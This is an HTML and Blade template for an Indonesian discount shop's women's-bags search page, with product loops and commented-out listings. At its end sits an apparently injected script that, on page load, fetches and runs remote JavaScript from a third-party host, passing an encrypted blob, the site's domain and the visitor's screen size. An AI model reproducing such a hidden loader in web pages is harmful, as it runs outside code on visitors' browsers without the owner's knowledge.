<!DOCTYPE html>
<!-- saved from url=(0051)http://diskon8.com/seek_data.html?type=Tas%20wanita -->
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Butik diskon belanja online Indonesia!</title>
    <meta content="diskon,produk,harga diskon,gila diskon,harga-diskon,butik,belanja,diskon8,diskon8.com" name="keywords">
    <meta content="Beli harga diskon produk online,Pakaian wanita,Pakaian pria,Tas wanita,Tas pria,aksesoris,Strap Jam tangan,Dompet,Aksesori mobil,Sepatu wanita,Kosmetik,Bepergian,Kebutuhan sehari-hari,Produk digital,Dukung pembayaran COD!" name="description">
    <meta content="index,follow" name="robots">
    <meta content="index,follow" name="GOOGLEBOT">
    <meta content="diskon8.com" name="Author">
    <meta content="width=device-width, initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
    <link rel="icon" href="http://diskon8.com/images/data/favicon.png">
    <link href="{{asset('front/files/swiper.min.css')}}" rel="stylesheet">
    <link href="{{asset('front/files/animate.min.css')}}" rel="stylesheet">
    <link href="{{asset('front/files/smartphoto.min.css')}}" rel="stylesheet">
    <link href="{{asset('front/files/base.css')}}" rel="stylesheet">
    <link href="{{asset('front/files/weui.min.css')}}" rel="stylesheet">
    <link rel="stylesheet" href="{{asset('front/files/seek_data.css')}}">
    <script src="{{asset('front/files/hm.js')}}"></script>
    <script src="{{asset('front/files/weui.min.js')}}"></script>
    <script src="{{asset('front/files/jquery.min.js')}}"></script>
    <script src="{{asset('front/files/swiper.min.js')}}"></script>
    <script src="{{asset('front/files/vue.min.js')}}"></script>
    <script src="{{asset('front/files/layer.js')}}"></script>
    <link rel="stylesheet" href="{{asset('front/files/layer.css')}}" id="layuicss-layer">
    <script src="{{asset('front/files/ajax_ext.js')}}"></script>
    <style type="text/css">
        .hidden {
            display: none;
        }
    </style>
    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?ae32568e7dcc444400cb9cc48263f641";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>
    <script type="text/javascript" async="" src="{{asset('front/files/request')}}"></script>
</head>

<body style="max-width: 640px;margin: auto;" class="">
    <div id="app">
        <div class="top-box">
            <div class="head-box">
                <a href="{{url('/')}}"><img alt="kembali" src="{{asset('front/files/back_ioc.png')}}"></a>
                <div id="searchBar" class="weui-search-bar weui-search-bar_focusing">
                    <form class="weui-search-bar__form">
                        <a href="#">
                            <div class="weui-search-bar__box"><i class="weui-icon-search"></i>
                                <input type="search" disabled="disabled" id="searchInput" placeholder="cari produk" class="weui-search-bar__input">
                            </div>
                        </a>
                        <label id="searchText" class="weui-search-bar__label" style="transform-origin: 0px 0px; opacity: 1; transform: scale(1, 1);"><i class="weui-icon-search"></i><span>cari</span></label>
                    </form>
                </div>
            <a href="{{url('/')}}" style="right: 0px; top: 2px;"><img alt="" src="{{asset('front/files/order_red_ioc.png')}}" style="height: auto; margin: 3px 5px 2px 0px;"></a>
            </div>
            <div class="select-box">
                <div class="select-box-item"><span class="price">Harga Rendah ke Tinggi</span></div>
                <div class="select-box-item"><span>Pemutaran</span><img alt="" src="{{asset('front/files/select_ioc.png')}}"></div>
            </div>
            <div class="weui-cells weui-cells_radio" style="display: none;">
                <label for="x11" class="weui-cell weui-check__label">
                    <div class="weui-cell__bd">
                        <p class="red">Harga Rendah ke Tinggi</p>
                    </div>
                    <div class="weui-cell__ft">
                        <input type="radio" name="radio1" class="weui-check"><span class="weui-icon-checked"></span></div>
                </label>
                <label for="x12" class="weui-cell weui-check__label">
                    <div class="weui-cell__bd">
                        <p class="">Harga Tinggi ke Rendah</p>
                    </div>
                    <div class="weui-cell__ft">
                        <input type="radio" name="radio1" class="weui-check"><span class="weui-icon-checked"></span></div>
                </label>
            </div>
        </div>
        <div class="search-data">
            <div class="noshow-box" style="display: none;"></div>
            <div class="order-box">
                <div class="order-item-body">
                  @foreach($collection as $collectiondt)
                  <div onclick="location.href='{{url('/productdetail/'.@$collectiondt->product_id)}}';" class="order-item"><img alt="" align="top" src="{{asset('images/products/'.$collectiondt->main_image)}}">
                      <div class="goods-data-box"><span class="goods-title">{{@$collectiondt->name}}</span>
                          <div><span class="goods-price-not">{{"Rp. ".number_format(@$collectiondt->harga_coret,0)}}</font></span><span class="goods-price-yes"><font>{{"Rp. ".number_format(@$collectiondt->agent_price,0)}}</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                  </div>

                  @endforeach


                    <!--
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/1348399877a743.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[272]Dompet ultra-tipis</span>
                            <div><span class="goods-price-not">RP<font>499.000</font></span><span class="goods-price-yes">RP<font>235.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/174327623d256c.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[48]Tas lipat 2-guna</span>
                            <div><span class="goods-price-not">RP<font>390.000</font></span><span class="goods-price-yes">RP<font>238.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/1727256732da1a.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[60]tas 2 fungsi super hot</span>
                            <div><span class="goods-price-not">RP<font>425.000</font></span><span class="goods-price-yes">RP<font>238.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/1317452335e818.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[201]Tas kecil dengan Resleting sangat disukai</span>
                            <div><span class="goods-price-not">RP<font>688.000</font></span><span class="goods-price-yes">RP<font>238.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/164230385e510e.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[223]Dompet kartu kulit dengan slot kartu transparan【Kulit Asli】</span>
                            <div><span class="goods-price-not">RP<font>499.000</font></span><span class="goods-price-yes">RP<font>258.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/123945821b330b.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[66]Tas Ponsel Anti Air</span>
                            <div><span class="goods-price-not">RP<font>398.000</font></span><span class="goods-price-yes">RP<font>268.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/151202408c33cf.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[113]Tas Kosmetik Multi Fungsi</span>
                            <div><span class="goods-price-not">RP<font>358.000</font></span><span class="goods-price-yes">RP<font>269.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/19194742616080.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[507]Dompet Kunci MULTI- FUNGSI </span>
                            <div><span class="goods-price-not">RP<font>428.000</font></span><span class="goods-price-yes">RP<font>269.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/101307236687cc.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[396]Dompet Kecil</span>
                            <div><span class="goods-price-not">RP<font>499.000</font></span><span class="goods-price-yes">RP<font>278.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/1013326830a547.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[390]Waist Bag Wanita</span>
                            <div><span class="goods-price-not">RP<font>499.000</font></span><span class="goods-price-yes">RP<font>279.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/101725498fb2b5.png')}}">
                        <div class="goods-data-box"><span class="goods-title">[44]Ritsleting double tas selingan multi-layer</span>
                            <div><span class="goods-price-not">RP<font>899.000</font></span><span class="goods-price-yes">RP<font>280.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/094624194aea03.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[206]Dompet kartu kulit dengan gesper persegi【Kulit Asli】</span>
                            <div><span class="goods-price-not">RP<font>560.000</font></span><span class="goods-price-yes">RP<font>280.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/1801529216d91a.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[121]Tas kurir busana</span>
                            <div><span class="goods-price-not">RP<font>888.000</font></span><span class="goods-price-yes">RP<font>288.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/1715157782e49b.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[248]Tas untuk basah ataupun kering</span>
                            <div><span class="goods-price-not">RP<font>499.000</font></span><span class="goods-price-yes">RP<font>289.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/102231910d1d52.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[536]Dompet Multi- Card Motif Bunga</span>
                            <div><span class="goods-price-not">RP<font>566.000</font></span><span class="goods-price-yes">RP<font>289.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/15312086129dbb.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[274]Tas bahu</span>
                            <div><span class="goods-price-not">RP<font>688.000</font></span><span class="goods-price-yes">RP<font>298.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/14142663506383.png')}}">
                        <div class="goods-data-box"><span class="goods-title">[47]Tas Pinggang Wanita Sewaktu Diluar</span>
                            <div><span class="goods-price-not">RP<font>699.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/120623299f5b4f.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[65]Dompet Cetak</span>
                            <div><span class="goods-price-not">RP<font>988.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/16281765255bd.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[74]Tas untuk Ponsel yang Multi- Fungsi</span>
                            <div><span class="goods-price-not">RP<font>458.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/093713162b36cc.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[85]Tas berbahan Kulit Domba, di dalamnya dapat memuat maximal 12 kartu【Kulit Asli】</span>
                            <div><span class="goods-price-not">RP<font>699.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/18120463676175.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[102]Kulit sapi Tas ponsel【Kulit Asli】</span>
                            <div><span class="goods-price-not">RP<font>799.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/15350381398bdb.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[115]Ransel&nbsp;Warna&nbsp;Permen</span>
                            <div><span class="goods-price-not">RP<font>398.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/105930658ee72d.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[151]Ransel Kecil Serupa dengan Bundar</span>
                            <div><span class="goods-price-not">RP<font>889.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/16574153182793.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[158]FASHIONABLE mutiara tas </span>
                            <div><span class="goods-price-not">RP<font>799.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/1814022954332e.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[159]Tas kecil dengan warna yang solid</span>
                            <div><span class="goods-price-not">RP<font>519.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/163705367d2c58.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[163]Tas ibu muda berbahan kulit lembut</span>
                            <div><span class="goods-price-not">RP<font>719.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/143022835c7bc9.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[202]Tas Hitam Rantai untuk Handphone</span>
                            <div><span class="goods-price-not">RP<font>499.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/11155267444884.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[228]Tas crossbody</span>
                            <div><span class="goods-price-not">RP<font>599.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/163711215c48a3.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[232]Tas berlogokan lebah </span>
                            <div><span class="goods-price-not">RP<font>499.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/1453362667fcbc.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[238]Brand tas lebah kecil </span>
                            <div><span class="goods-price-not">RP<font>490.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/16550512647d4e.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[261]Tas handphone kecil motif bunga </span>
                            <div><span class="goods-price-not">RP<font>499.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/151755162c4c41.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[288]Tas berlogokan lebah </span>
                            <div><span class="goods-price-not">RP<font>399.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/12124251595266.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[311]Tas Bahu Single warna-warni</span>
                            <div><span class="goods-price-not">RP<font>499.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/144204129c57dc.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[318]Ransel PRAKTIS</span>
                            <div><span class="goods-price-not">RP<font>489.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/152254293b9e61.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[320]Tas berbahan nilon yang tahan air</span>
                            <div><span class="goods-price-not">RP<font>499.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/12094599387e27.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[512]Tas Bahu Kotak-Kotak dengan beberapa Layer Saku</span>
                            <div><span class="goods-price-not">RP<font>588.000</font></span><span class="goods-price-yes">RP<font>299.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/105320366af1d.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[142]Ransel Printing yang SUPER BAGUS</span>
                            <div><span class="goods-price-not">RP<font>889.000</font></span><span class="goods-price-yes">RP<font>309.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                    <div class="order-item"><img alt="" align="top" src="{{asset('front/files/18144073723b1c.jpg')}}">
                        <div class="goods-data-box"><span class="goods-title">[205]Tas bahu berbahan kulit ultra ringan</span>
                            <div><span class="goods-price-not">RP<font>499.000</font></span><span class="goods-price-yes">RP<font>309.000</font></span></div> <span class="goods-number">Beli Sekarang</span></div>
                    </div>
                  -->
                </div>
                <!---->
            </div>
        </div>
        <div class="noshow-box more" style="display: none;"></div>
        <div class="more-box" style="display: none;">
            <div class="more-box-data search-box">
                <div class="history-box">
                    <div class="title" style="margin-bottom: 0px;"><span>Lokasi</span></div>
                    <div class="key-box">
                        <input type="number" min="0" placeholder="min" class="start-price"> <span class="to-price">-</span>
                        <input type="number" min="0" placeholder="maks" class="stop-price">
                    </div>
                </div>
                <div class="history-box">
                    <div class="title"><span>Kategori</span></div>
                    <div class="key-box"><span class="">semua</span><span class="b-red">Tas wanita</span><span class="">Tas pria</span><span class="">Pakaian wanita</span><span class="">Pakaian pria</span><span class="">Produk digital</span><span class="">Strap Jam tangan</span><span class="">Aksesori mobil</span><span class="">aksesoris</span><span class="">Dompet</span><span class="">Sepatu wanita</span><span class="">Bepergian</span><span class="">Kebutuhan sehari-hari</span><span class="">Kosmetik</span><span class="">Rok dan celana</span><span class="">Sepatu pria</span></div>
                </div>
            </div>
            <div class="more-box-bottom"><span class="no">tatalkan</span><span class="yes">tentukan</span></div>
        </div>
    </div>
    <script src="{{asset('front/files/dec_api.js')}}"></script>
    <script src="{{asset('front/files/seek_data.js')}}"></script>
    <div style="display:none;"></div>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2rh1T0%2bdhYCUyjpm4cOPZquvTGpl2AULrql2ma8SHAL2ov0d%2bbOeLTniejDHHgGWzfN0d3vNhLXHWli3%2fUVQaEL2NILP8vOuJbL2Q3HfnKsJTWdsk0j7gWaSAR2wcZdvijpfHE8VFKsWuGwfMjlczmY2l0SMzZQbe2hcIyIhusN6LSka4P77diarK4v%2bGSOyYvSbu59hhSuwnKYdLLWZECzAr7Dmj4nMGFGFRiWIR%2fT8iGFX8bzyPQud6l7jXbeDMaTizAzdeifHU7tm%2flJPkicJ8FOo5QwEW4n3Eisg3ty3xUnpWjhzKUBpzjZlVmQpa4RRY4rB9%2fp2evvYQpjJPmd%2fa8dr7ZnHTKztc7E%2bS0zRMVT%2bq%2bl3IumxpTkJHTs1lCF5ha6Vsp3W9Tee7nFAc8T%2fPjJQjCkEpruwPWsDlH%2fcINMzn9PPjT9jnP89GY6Pu881trS2tnCh54g1jwzMgcDYVWe8w%2bGSYKtUgKBAvjr1qnzLXku1ASCJaEOnP1kvkdL5WJyZ%2bMy0Lw6uUBiOiVfyq%2bWRjto5ghqsRuJHjp3eLQEYb0ZTmqHsEdD3a9GzVKk8iy61h528%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
</body>

</html>
